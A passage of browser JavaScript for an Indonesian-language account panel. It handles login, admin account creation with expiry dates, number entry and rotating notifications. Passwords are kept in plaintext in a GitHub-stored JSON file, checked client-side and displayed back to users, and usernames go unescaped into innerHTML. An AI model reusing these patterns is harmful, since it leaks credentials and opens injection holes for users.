      const daysLeft = Math.ceil(diff / (1000*60*60*24));

      if(daysLeft > 0){
        expiredText = `${daysLeft} hari lagi`;
      } else {
        expiredText = `Lewat ${Math.abs(daysLeft)} hari`;
      }
    }

    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${i+1}</td>
      <td>${acc.username}</td>
      <td>${acc.role}</td>
      <td>${expiredText}</td>
      <td>
        <button class="btn small danger" onclick="deleteAccount('${acc.username}')">Hapus</button>
      </td>
    `;
    body.appendChild(tr);
  });
}

    async function createAccount(u,p,r,expInput){
  if(!u||!p) throw new Error('Username & password wajib');
  if(state.loginList.some(x=>x.username===u)) throw new Error('Username sudah ada');

  // parse di sini, bukan langsung simpan expInput
  const expDate = parseExpired(expInput);

  if(!Array.isArray(state.loginList)) state.loginList = [];

  state.loginList.push({
    username: u,
    password: p,
    role: r,
    expired: expDate || null
  });

  await githubPut(API_LOGIN, TOKEN_LOGIN, state.loginList, `create user ${u}`, state.loginSha);
  await loadLogins();
  renderAccounts();
}

    // ====== UI WIRING ======
    const formLogin = document.getElementById('formLogin');
    const loginMsg = document.getElementById('loginMsg');
    const numMsg   = document.getElementById('numMsg');
    const accMsg   = document.getElementById('accMsg');
    const drawer   = document.getElementById('drawer');

    document.getElementById('btnHamburger').onclick = ()=> drawer.classList.toggle('open');

    document.querySelectorAll('.menu a[data-view]').forEach(a=>{
      a.addEventListener('click', async (e)=>{
        e.preventDefault(); const v = a.dataset.view; setView(v);
        if(v==='numbers'){ await loadNumbers(); }
        if(v==='accounts'){ await loadLogins(); renderAccounts(); }
      })
    })

    formLogin.addEventListener('submit', async (e)=>{
      e.preventDefault(); 
      loginMsg.textContent = 'Memeriksaâ€¦';
      const u = document.getElementById('username').value.trim();
      const p = document.getElementById('password').value.trim();
      try{
        const ok = await doLogin(u,p);
        if(!ok){ 
          toast(loginMsg, 'Username atau password salah', false); 
          return; 
        }
        toast(loginMsg, 'Berhasil masuk');
        document.getElementById('who').textContent = u + ' â€¢ ' + ok.role;
        document.getElementById('userBadge').classList.remove('hidden');
        document.getElementById('roleChip').textContent = ok.role;
        if(ok.role==='admin') document.getElementById('adminSection').classList.remove('hidden');
        document.getElementById('btnHamburger').classList.remove('hidden');
  document.getElementById('btnProfile').classList.remove('hidden');

    // ðŸ”¥ panggil nav biar muncul
    showBottomNav();
        setView('dashboard');
        await loadNumbers();
      }catch(err){ 
        toast(loginMsg, err.message, false); 
      }
    });

    document.getElementById('btnAddNumber').onclick = async()=>{
      const field = document.getElementById('numberInput');
      try{ await addNumber(field.value.trim()); toast(numMsg,'Nomor ditambahkan'); field.value=''; }
      catch(e){ toast(numMsg, e.message, false) }
    }

    document.getElementById('btnCreate').onclick = async()=>{
  const u   = document.getElementById('newUser').value.trim();
  const p   = document.getElementById('newPass').value.trim();
  const r   = document.getElementById('newRole').value; 
  const exp = document.getElementById('newExpired').value.trim() || null;

  try { 
    await createAccount(u,p,r,exp); 
    toast(accMsg,'Akun dibuat');
    document.getElementById('newUser').value='';
    document.getElementById('newPass').value='';
    document.getElementById('newExpired').value='';
  } catch(e){ 
    toast(accMsg, e.message, false); 
  }
}

    // Reveal on scroll
    const io = new IntersectionObserver((entries)=>{
      entries.forEach(e=>{ if(e.isIntersecting) e.target.classList.add('visible') })
    }, {threshold:.15});
    document.querySelectorAll('.reveal').forEach(el=> io.observe(el));
    
    // Reveal untuk bug-card (staggered animasi)
const bugCards = document.querySelectorAll('.bug-card');
const ioBug = new IntersectionObserver((entries)=>{
  entries.forEach(e=>{
    if(e.isIntersecting){
      bugCards.forEach((card, idx)=>{
        setTimeout(()=> card.classList.add('visible'), idx * 200); // delay 200ms per item
      });
      ioBug.disconnect();
    }
  });
}, {threshold:.2});
if(bugCards.length) ioBug.observe(bugCards[0]);

// Start
    restoreSession();

document.addEventListener("DOMContentLoaded", () => {
  const btnProfile = document.getElementById('btnProfile');
  const profileCard = document.getElementById('profileCard');
  const closeProfile = document.getElementById('closeProfile');
  const profileUsername = document.getElementById('profileUsername');
  const profilePassword = document.getElementById('profilePassword');
  const profileExpired = document.getElementById('profileExpired');
  const profileLogout = document.getElementById('profileLogout');

  function daysLeft(exp){
    if(!exp) return "Tidak ada";
    const expDate = new Date(exp).getTime();
    const now = Date.now();
    const diff = expDate - now;
    const days = Math.ceil(diff / (1000*60*60*24));
    return days > 0 ? `${days} hari lagi` : `Expired ${Math.abs(days)} hari lalu`;
  }

  btnProfile.addEventListener("click", async () => {
    await loadLogins();
    const found = state.loginList.find(u => u.username === state.user);
    if(found){
      profileUsername.textContent = found.username;
      profilePassword.textContent = found.password;
      profileExpired.textContent = daysLeft(found.expired);
    }
    profileCard.classList.add('show');
  });

  closeProfile.addEventListener("click", () => {
    profileCard.classList.remove('show');
  });

  profileLogout.addEventListener("click", logout);
});

function showPopupNotif(text, success = true) {
  const popup = document.getElementById("notifPopup");
  const popupText = document.getElementById("notifText");
  const popupIcon = popup.querySelector("i");

  popupText.textContent = text;

  if (success) {
    popupIcon.className = "fa-solid fa-circle-check";
    popupIcon.style.color = "lime";
  } else {
    popupIcon.className = "fa-solid fa-circle-xmark";
    popupIcon.style.color = "red";
  }

  popup.classList.add("show");
  popup.classList.remove("hidden");

  // âœ… Muncul cepat, bertahan lama (3.5 detik), lalu smooth hilang
  setTimeout(() => {
    popup.classList.remove("show");
    setTimeout(() => popup.classList.add("hidden"), 250);
  }, 3500);
}

  



async function startNotifCycle() {
  try {
    const res = await fetch("https://raw.githubusercontent.com/DaffaDevv/ACTIVITY/main/activity.json");
    const data = await res.json();

    const allMessages = Object.keys(data.Servers || {})
      .filter(k => k.toLowerCase().startsWith("message"))
      .map(k => data.Servers[k])
      .filter(Boolean);

    let queue = [];

    function shuffleMessages() {
      queue = [...allMessages];
      for (let i = queue.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [queue[i], queue[j]] = [queue[j], queue[i]];
      }
    }

    shuffleMessages();

    const box = document.getElementById("topNotif");
    const nameEl = document.getElementById("notifName");
    const msgEl = document.getElementById("notifMsg");
    const sound = document.getElementById("notifSound");
    const btnClose = document.getElementById("notifClose");

    function showNotif() {
      if (!queue.length) shuffleMessages();

      const msg = queue.shift();
      if (!msg) return;

      nameEl.textContent = "NOTIFICATION";
      msgEl.textContent = msg;
      box.classList.remove("hidden");

      // mainkan suara dengan sedikit delay biar sinkron
      if (sound) {
        sound.currentTime = 0;
        setTimeout(() => {
          sound.play().catch(err => console.warn("Audio blocked:", err));
        }, 200); // 0.2 detik setelah popup muncul
      }

      setTimeout(() => box.classList.add("hidden"), 5000);
    }

    btnClose.onclick = () => {
      box.classList.add("hidden");
    };

    showNotif();
    setInterval(showNotif, 20000); // jeda 20 detik
  } catch (err) {
    console.error("Notif error:", err);
  }
}
